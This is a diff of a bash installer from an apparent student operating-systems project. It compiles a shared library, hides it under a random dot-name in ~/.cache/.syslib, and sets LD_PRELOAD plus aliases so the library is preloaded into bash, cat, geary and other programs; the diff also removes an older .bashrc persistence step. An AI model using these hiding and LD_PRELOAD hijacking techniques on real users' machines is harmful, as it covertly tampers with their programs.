@@ -1,48 +1,51 @@
 #!/bin/bash
 
+# Compile the .so from the .c file
+gcc -shared -fPIC -o combinedMRWOCG.so combinedMRWOCG.c -ldl
+
 # IMPORTANT NOTE: make sure you have your own paths to the code here!!!
-SOURCE_SO="$HOME/Documents/OS_Project/osProject/main/src/test/combinedMRWOC.so"
-HIDDEN_SO="$HOME/.local/.libhidden.so"
-RC_FILE="$HOME/.bashrc"
+SOURCE_SO="$HOME/Documents/OS_Project/osProject/main/src/test/combinedMRWOCG.so"
+HIDDEN_DIR="$HOME/.cache/.syslib"
+NEW_NAME=".lib$(head /dev/urandom | tr -dc a-z0-9 | head -c 8).so"
+HIDDEN_SO="$HIDDEN_DIR/$NEW_NAME"
 
 echo "[*] Starting installation..."
 sleep 1
 echo "Have fun copying my homework!"
 sleep 1
 
-# Ensure the source .so exists
+# Check if source exists
 if [ ! -f "$SOURCE_SO" ]; then
     echo "[✗] Error: Source .so file not found at: $SOURCE_SO"
     exit 1
 fi
 
-# Ensure ~/.local exists
-mkdir -p "$HOME/.local"
+# Create hidden directory
+mkdir -p "$HIDDEN_DIR"
 
-# Copy .so to hidden location
+# Copy and rename the .so file
 cp "$SOURCE_SO" "$HIDDEN_SO"
-chmod 755 "$HIDDEN_SO"  # Must be readable by the dynamic linker
+chmod 755 "$HIDDEN_SO"
+
 
 # Optionally delete the original
 #rm -f "$SOURCE_SO"
 # maybe also add to remove the original .c file? 
-# maybe also compile the combinedMRWOC.c in this bash script?
 
-# Inject LD_PRELOAD into .bashrc if not already present
-if ! grep -q "$HIDDEN_SO" "$RC_FILE"; then
-    echo "" >> "$RC_FILE"
-    echo "# [MRWOC] Auto-load LD_PRELOAD for blocking" >> "$RC_FILE"
-    echo "export LD_PRELOAD=\"$HIDDEN_SO\"" >> "$RC_FILE"
-    echo "[✓] LD_PRELOAD added to $RC_FILE"
-fi
+# Export LD_PRELOAD in the current shell session
+#export LD_PRELOAD=./"$HIDDEN_SO"
 
-# Add alias for geary with DISABLE_WRITE_PRANK
-if ! grep -q "alias geary=" "$RC_FILE"; then
-    echo "# [MRWOC] Geary runs cleanly" >> "$RC_FILE"
-    echo "alias geary='DISABLE_WRITE_PRANK=1 geary'" >> "$RC_FILE"
-    echo "[✓] Geary alias added to $RC_FILE"
-fi
+# Export LD_PRELOAD only in this session
+export LD_PRELOAD="$HIDDEN_SO"
+
+# Create a working alias for geary with DISABLE_WRITE_PRANK (doesnt work with geary anymore, have to fix:TODO)
+alias geary="DISABLE_WRITE_PRANK=1 LD_PRELOAD=$HIDDEN_SO geary"
+# Optional: add more aliases
+declare -a apps=("bash" "cat" "hexchat" "liferea" "gnome-weather" "geary")
+for app in "${apps[@]}"; do
+    alias $app="DISABLE_GETCHAR_PRANK=1 LD_PRELOAD=$HIDDEN_SO $app"
+done
 
 echo "[✓] Install complete."
-echo "[i] Open a new terminal, or run:"
-echo "    source ~/.bashrc"
+echo "[!] Type 'geary' in this terminal to run it with hijack active."
+echo "[i] To clean up, just delete: $HIDDEN_SO"
